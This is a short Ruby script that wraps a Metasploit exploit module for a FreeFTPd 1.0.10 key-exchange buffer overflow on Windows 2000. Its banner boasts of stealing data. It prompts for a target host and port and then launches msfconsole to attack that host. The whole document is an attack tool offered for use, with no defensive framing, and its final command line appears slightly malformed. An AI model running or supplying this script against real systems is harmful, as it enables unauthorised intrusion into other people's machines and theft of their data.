puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

     FreeFTPd 1.0.10 Key Exchange Algorithm
			 String Buffer Overflow

	 	  Windows 2000 SP0-SP4 English

       		 Starting Port:: 22   

"""

puts " [?] What is the target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Start with 22]  "
print "[!] ---> "

port = gets.chomp


exec("msfconsole -x 'use exploit/windows/ssh/freeftpd_key_exchange' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run' 'run'")
